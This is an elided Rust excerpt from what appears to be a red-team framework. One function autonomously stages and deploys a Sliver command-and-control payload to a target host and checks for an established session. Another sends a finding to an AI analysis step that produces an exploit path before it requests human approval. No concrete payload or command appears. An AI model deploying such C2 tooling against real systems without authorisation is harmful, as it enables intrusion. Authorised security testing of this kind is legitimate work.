...
impl<M: ExecutorMode> PocValidator<M> {
    pub(crate) async fn deploy_c2(&self, target: &TargetHost) -> Result<()> {
        let sovereign_operator =
            crate::plugins::lateral_movement::sliver_sovereign::SovereignSliverOperator::<M>::new(
                self.executor.clone(),
            )
            .await?;
        ...
        match sovereign_operator.prepare_payload(target).await {
            Ok(payload_path) => {
                info!(
                    "🔱 V14.1 SOVEREIGN: Autonomous C2 payload staged at {}. Deploying...",
                    payload_path
                );
                ...
                match sovereign_operator.verify_session(target).await? {
                    SessionState::Sovereign => {
                        info!(
                            "🎯 V14.1 SOVEREIGN: C2 SESSION ALREADY ESTABLISHED for {}",
                            target.host
                        );
                    }
                    _ => {
                        sovereign_operator
                            .deploy_payload(target, &payload_path)
                            .await?;
                        tokio::time::sleep(Duration::from_secs(10)).await;

                        if sovereign_operator.verify_session(target).await?
                            == SessionState::Sovereign
                        {
                            info!(
                                "🎯 V14.1 SOVEREIGN: AUTONOMOUS C2 SESSION ESTABLISHED for {}",
                                target.host
                            );
                        }
                    }
    ...
    pub(crate) async fn sovereign_handover(
        &self,
        finding: &mut Finding,
        target: &TargetHost,
        poc: &PocDefinition,
        ...
        let human_instruction = crate::core::ai::caveman::CavemanOptimizer::pivot_to_human_readable(
            &raw_instruction,
            true,
        );
        ...
        let analysis = self
            ...
            .analyze_with_level(
                finding,
                target,
                Some(&human_instruction),
                crate::core::ai::RouteLevel::Premium,
                crate::core::ai::CavemanLevel::Off,
            )
            .await?;
        ...
        let context = format!(
            ...
            target.host,
            finding.core.title,
            poc.complexity_score,
            analysis.summary,
            analysis.exploit_path
        );

        let req_id = self
            .approval_gate
            .request_approval(
                &format!("HANDOVER: {}", finding.core.title),
                100,
                &self.operator,
                &context,
            )
